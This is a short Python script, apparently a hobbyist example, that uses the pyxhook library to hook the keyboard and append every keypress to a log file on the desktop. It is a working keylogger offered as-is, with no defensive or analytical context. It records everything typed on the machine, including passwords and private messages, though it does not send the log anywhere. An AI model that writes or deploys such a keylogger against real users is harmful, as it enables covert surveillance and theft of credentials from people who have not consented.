import os 
import pyxhook 

PATH = '~/Scrivania/file.log' #Feel free to change it 
log_file = os.path.expanduser(PATH) 


#Creating the function that react to a keypress: saving the key on the log file and printing new line 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key)) 
  
#Setting up the hook, using our function to react at keypressing
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
new_hook.HookKeyboard() 
try: 
    new_hook.start()
except KeyboardInterrupt: 
    # User cancelled from command line. 
    pass
except Exception as ex: 
    #If somethings gone wrong we have a track on log file 
    msg = '**Error**\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg)) 
